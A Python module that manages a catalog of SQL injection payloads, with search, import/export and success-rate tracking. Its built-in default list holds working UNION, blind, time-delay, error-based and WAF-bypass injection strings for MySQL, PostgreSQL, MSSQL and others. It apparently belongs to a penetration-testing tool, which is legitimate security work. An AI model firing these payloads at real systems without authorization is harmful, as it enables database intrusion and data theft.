"""
Payload catalog management and storage
"""

import json
import os
from typing import Dict, List, Any, Optional
from datetime import datetime


class PayloadCatalog:
    """
    Manages a catalog of SQL injection payloads with metadata and effectiveness tracking.
    """
    
    def __init__(self, catalog_file: str = "data/payloads/payload_database.json"):
        """
        Initialize the payload catalog.
        
        Args:
            catalog_file: Path to the payload database file
        """
        self.catalog_file = catalog_file
        self.payloads = {}
        self.categories = {
            'union_based': [],
            'boolean_blind': [],
            'time_based': [],
            'error_based': [],
            'stacked_queries': [],
            'bypass_authentication': [],
            'waf_bypass': [],
            'custom': []
        }
        self.metadata = {
            'created': datetime.now().isoformat(),
            'last_updated': datetime.now().isoformat(),
            'total_payloads': 0,
            'version': '1.0'
        }
        self.effectiveness_stats = {}
        
        self._load_catalog()
    
    def _load_catalog(self):
        """
        Load the payload catalog from file.
        """
        if os.path.exists(self.catalog_file):
            try:
                with open(self.catalog_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.payloads = data.get('payloads', {})
                    self.categories = data.get('categories', self.categories)
                    self.metadata = data.get('metadata', self.metadata)
                    self.effectiveness_stats = data.get('effectiveness_stats', {})
            except Exception as e:
                print(f"Error loading catalog: {e}")
                self._initialize_default_catalog()
        else:
            self._initialize_default_catalog()
    
    def _initialize_default_catalog(self):
        """
        Initialize the catalog with default payloads.
        """
        default_payloads = {
            'union_based': [
                {
                    'id': 'union_001',
                    'payload': "' UNION SELECT 1,2,3--",
                    'description': 'Basic UNION SELECT with 3 columns',
                    'risk_level': 'medium',
                    'database_types': ['mysql', 'postgresql', 'mssql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'union_002',
                    'payload': "' UNION ALL SELECT NULL,NULL,NULL--",
                    'description': 'UNION with NULL values for compatibility',
                    'risk_level': 'medium',
                    'database_types': ['mysql', 'postgresql', 'mssql', 'oracle'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'union_003',
                    'payload': "' UNION SELECT @@version,2,3--",
                    'description': 'Version disclosure via UNION',
                    'risk_level': 'high',
                    'database_types': ['mysql', 'mssql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                }
            ],
            'boolean_blind': [
                {
                    'id': 'bool_001',
                    'payload': "' AND 1=1--",
                    'description': 'Basic true condition',
                    'risk_level': 'low',
                    'database_types': ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'bool_002',
                    'payload': "' AND 1=2--",
                    'description': 'Basic false condition',
                    'risk_level': 'low',
                    'database_types': ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'bool_003',
                    'payload': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    'description': 'Check for information_schema access',
                    'risk_level': 'medium',
                    'database_types': ['mysql', 'postgresql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                }
            ],
            'time_based': [
                {
                    'id': 'time_001',
                    'payload': "' AND SLEEP(5)--",
                    'description': 'MySQL time delay',
                    'risk_level': 'medium',
                    'database_types': ['mysql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'time_002',
                    'payload': "'; WAITFOR DELAY '00:00:05'--",
                    'description': 'MSSQL time delay',
                    'risk_level': 'medium',
                    'database_types': ['mssql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'time_003',
                    'payload': "' AND pg_sleep(5)--",
                    'description': 'PostgreSQL time delay',
                    'risk_level': 'medium',
                    'database_types': ['postgresql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                }
            ],
            'error_based': [
                {
                    'id': 'error_001',
                    'payload': "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                    'description': 'MySQL EXTRACTVALUE error-based injection',
                    'risk_level': 'high',
                    'database_types': ['mysql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'error_002',
                    'payload': "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--",
                    'description': 'MySQL UPDATEXML error-based injection',
                    'risk_level': 'high',
                    'database_types': ['mysql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                }
            ],
            'waf_bypass': [
                {
                    'id': 'bypass_001',
                    'payload': "' /**/UNION/**/SELECT/**/1,2,3--",
                    'description': 'Comment-based keyword bypass',
                    'risk_level': 'medium',
                    'database_types': ['mysql', 'postgresql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                },
                {
                    'id': 'bypass_002',
                    'payload': "' %55NION %53ELECT 1,2,3--",
                    'description': 'URL encoding bypass',
                    'risk_level': 'medium',
                    'database_types': ['mysql', 'postgresql', 'mssql'],
                    'success_rate': 0.0,
                    'usage_count': 0,
                    'created': datetime.now().isoformat()
                }
            ]
        }
        
        # Populate categories and payloads
        for category, payload_list in default_payloads.items():
            self.categories[category] = []
            for payload_data in payload_list:
                payload_id = payload_data['id']
                self.payloads[payload_id] = payload_data
                self.categories[category].append(payload_id)
        
        self.metadata['total_payloads'] = len(self.payloads)
        self._save_catalog()
    
    def add_payload(self, payload: str, category: str, description: str = '',
                   risk_level: str = 'medium', database_types: List[str] = None,
                   metadata: Dict[str, Any] = None) -> str:
        """
        Add a new payload to the catalog.
        
        Args:
            payload: The SQL injection payload
            category: Category of the payload
            description: Description of the payload
            risk_level: Risk level (low, medium, high, critical)
            database_types: List of compatible database types
            metadata: Additional metadata
            
        Returns:
            Payload ID
        """
        if database_types is None:
            database_types = ['mysql']
        
        if metadata is None:
            metadata = {}
        
        # Generate unique ID
        category_count = len(self.categories.get(category, [])) + 1
        payload_id = f"{category}_{category_count:03d}"
        
        # Ensure unique ID
        while payload_id in self.payloads:
            category_count += 1
            payload_id = f"{category}_{category_count:03d}"
        
        # Create payload entry
        payload_data = {
            'id': payload_id,
            'payload': payload,
            'description': description,
            'category': category,
            'risk_level': risk_level,
            'database_types': database_types,
            'success_rate': 0.0,
            'usage_count': 0,
            'created': datetime.now().isoformat(),
            'last_used': None,
            'metadata': metadata
        }
        
        # Add to catalog
        self.payloads[payload_id] = payload_data
        
        # Add to category
        if category not in self.categories:
            self.categories[category] = []
        self.categories[category].append(payload_id)
        
        # Update metadata
        self.metadata['total_payloads'] = len(self.payloads)
        self.metadata['last_updated'] = datetime.now().isoformat()
        
        self._save_catalog()
        return payload_id
    
    def get_payload(self, payload_id: str) -> Optional[Dict[str, Any]]:
        """
        Get a payload by ID.
        
        Args:
            payload_id: Payload identifier
            
        Returns:
            Payload data or None if not found
        """
        return self.payloads.get(payload_id)
    
    def get_payloads_by_category(self, category: str) -> List[Dict[str, Any]]:
        """
        Get all payloads in a specific category.
        
        Args:
            category: Category name
            
        Returns:
            List of payload data
        """
        payload_ids = self.categories.get(category, [])
        return [self.payloads[pid] for pid in payload_ids if pid in self.payloads]
    
    def search_payloads(self, query: str, category: str = None, 
                       database_type: str = None, risk_level: str = None) -> List[Dict[str, Any]]:
        """
        Search payloads based on criteria.
        
        Args:
            query: Search query (searches in payload and description)
            category: Filter by category
            database_type: Filter by database type
            risk_level: Filter by risk level
            
        Returns:
            List of matching payloads
        """
        results = []
        
        for payload_id, payload_data in self.payloads.items():
            # Text search
            if query:
                query_lower = query.lower()
                if (query_lower not in payload_data['payload'].lower() and 
                    query_lower not in payload_data.get('description', '').lower()):
                    continue
            
            # Category filter
            if category and payload_data.get('category') != category:
                continue
            
            # Database type filter
            if database_type and database_type not in payload_data.get('database_types', []):
                continue
            
            # Risk level filter
            if risk_level and payload_data.get('risk_level') != risk_level:
                continue
            
            results.append(payload_data)
        
        return results
    
    def update_payload_stats(self, payload_id: str, success: bool):
        """
        Update payload usage statistics.
        
        Args:
            payload_id: Payload identifier
            success: Whether the payload was successful
        """
        if payload_id not in self.payloads:
            return
        
        payload_data = self.payloads[payload_id]
        
        # Update usage count
        payload_data['usage_count'] = payload_data.get('usage_count', 0) + 1
        payload_data['last_used'] = datetime.now().isoformat()
        
        # Update success rate
        if payload_id not in self.effectiveness_stats:
            self.effectiveness_stats[payload_id] = {
                'total_attempts': 0,
                'successes': 0
            }
        
        stats = self.effectiveness_stats[payload_id]
        stats['total_attempts'] += 1
        if success:
            stats['successes'] += 1
        
        # Calculate new success rate
        payload_data['success_rate'] = stats['successes'] / stats['total_attempts']
        
        self._save_catalog()
    
    def get_top_payloads(self, category: str = None, limit: int = 10, 
                        sort_by: str = 'success_rate') -> List[Dict[str, Any]]:
        """
        Get top-performing payloads.
        
        Args:
            category: Filter by category
            limit: Maximum number of results
            sort_by: Sort criteria ('success_rate', 'usage_count')
            
        Returns:
            List of top payloads
        """
        payloads = list(self.payloads.values())
        
        # Filter by category
        if category:
            payloads = [p for p in payloads if p.get('category') == category]
        
        # Filter payloads with usage
        payloads = [p for p in payloads if p.get('usage_count', 0) > 0]
        
        # Sort by criteria
        if sort_by == 'success_rate':
            payloads.sort(key=lambda p: p.get('success_rate', 0), reverse=True)
        elif sort_by == 'usage_count':
            payloads.sort(key=lambda p: p.get('usage_count', 0), reverse=True)
        
        return payloads[:limit]
    
    def export_category(self, category: str, format: str = 'json') -> str:
        """
        Export payloads from a category.
        
        Args:
            category: Category to export
            format: Export format ('json', 'text', 'csv')
            
        Returns:
            Exported data as string
        """
        payloads = self.get_payloads_by_category(category)
        
        if format == 'json':
            return json.dumps(payloads, indent=2)
        elif format == 'text':
            lines = []
            for payload_data in payloads:
                lines.append(f"ID: {payload_data['id']}")
                lines.append(f"Payload: {payload_data['payload']}")
                lines.append(f"Description: {payload_data.get('description', 'N/A')}")
                lines.append(f"Risk Level: {payload_data.get('risk_level', 'N/A')}")
                lines.append("-" * 50)
            return '\n'.join(lines)
        elif format == 'csv':
            lines = ['ID,Payload,Description,Risk Level,Success Rate,Usage Count']
            for payload_data in payloads:
                lines.append(
                    f"{payload_data['id']},"
                    f"\"{payload_data['payload']}\","
                    f"\"{payload_data.get('description', '')}\","
                    f"{payload_data.get('risk_level', '')},"
                    f"{payload_data.get('success_rate', 0)},"
                    f"{payload_data.get('usage_count', 0)}"
                )
            return '\n'.join(lines)
        
        return ""
    
    def import_payloads(self, data: str, format: str = 'json', category: str = 'custom'):
        """
        Import payloads from external data.
        
        Args:
            data: Data to import
            format: Data format ('json', 'text', 'csv')
            category: Category for imported payloads
        """
        if format == 'json':
            try:
                payloads = json.loads(data)
                for payload_data in payloads:
                    if 'payload' in payload_data:
                        self.add_payload(
                            payload=payload_data['payload'],
                            category=category,
                            description=payload_data.get('description', ''),
                            risk_level=payload_data.get('risk_level', 'medium'),
                            database_types=payload_data.get('database_types', ['mysql'])
                        )
            except Exception as e:
                print(f"Error importing JSON: {e}")
        
        elif format == 'text':
            lines = data.strip().split('\n')
            for line in lines:
                if line.strip():
                    self.add_payload(
                        payload=line.strip(),
                        category=category,
                        description='Imported payload'
                    )
        
        elif format == 'csv':
            lines = data.strip().split('\n')[1:]  # Skip header
            for line in lines:
                parts = line.split(',')
                if len(parts) >= 2:
                    payload = parts[1].strip('"')
                    description = parts[2].strip('"') if len(parts) > 2 else ''
                    risk_level = parts[3].strip() if len(parts) > 3 else 'medium'
                    
                    self.add_payload(
                        payload=payload,
                        category=category,
                        description=description,
                        risk_level=risk_level
                    )
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get catalog statistics.
        
        Returns:
            Dictionary with catalog statistics
        """
        stats = {
            'total_payloads': len(self.payloads),
            'categories': {cat: len(ids) for cat, ids in self.categories.items()},
            'risk_levels': {},
            'database_types': {},
            'usage_stats': {
                'total_usage': sum(p.get('usage_count', 0) for p in self.payloads.values()),
                'average_success_rate': 0.0,
                'most_used_payload': None,
                'highest_success_payload': None
            }
        }
        
        # Risk level distribution
        for payload_data in self.payloads.values():
            risk = payload_data.get('risk_level', 'unknown')
            stats['risk_levels'][risk] = stats['risk_levels'].get(risk, 0) + 1
        
        # Database type distribution
        for payload_data in self.payloads.values():
            for db_type in payload_data.get('database_types', []):
                stats['database_types'][db_type] = stats['database_types'].get(db_type, 0) + 1
        
        # Usage statistics
        used_payloads = [p for p in self.payloads.values() if p.get('usage_count', 0) > 0]
        if used_payloads:
            stats['usage_stats']['average_success_rate'] = (
                sum(p.get('success_rate', 0) for p in used_payloads) / len(used_payloads)
            )
            
            most_used = max(used_payloads, key=lambda p: p.get('usage_count', 0))
            stats['usage_stats']['most_used_payload'] = most_used['id']
            
            highest_success = max(used_payloads, key=lambda p: p.get('success_rate', 0))
            stats['usage_stats']['highest_success_payload'] = highest_success['id']
        
        return stats
    
    def _save_catalog(self):
        """
        Save the catalog to file.
        """
        data = {
            'payloads': self.payloads,
            'categories': self.categories,
            'metadata': self.metadata,
            'effectiveness_stats': self.effectiveness_stats
        }
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(self.catalog_file), exist_ok=True)
        
        try:
            with open(self.catalog_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"Error saving catalog: {e}")
    
    def backup_catalog(self, backup_path: str = None):
        """
        Create a backup of the catalog.
        
        Args:
            backup_path: Path for backup file
        """
        if backup_path is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_path = f"{self.catalog_file}.backup_{timestamp}"
        
        try:
            with open(self.catalog_file, 'r', encoding='utf-8') as source:
                with open(backup_path, 'w', encoding='utf-8') as backup:
                    backup.write(source.read())
            print(f"Catalog backed up to: {backup_path}")
        except Exception as e:
            print(f"Error creating backup: {e}")
    
    def restore_catalog(self, backup_path: str):
        """
        Restore catalog from backup.
        
        Args:
            backup_path: Path to backup file
        """
        try:
            with open(backup_path, 'r', encoding='utf-8') as backup:
                with open(self.catalog_file, 'w', encoding='utf-8') as target:
                    target.write(backup.read())
            self._load_catalog()
            print(f"Catalog restored from: {backup_path}")
        except Exception as e:
            print(f"Error restoring catalog: {e}")
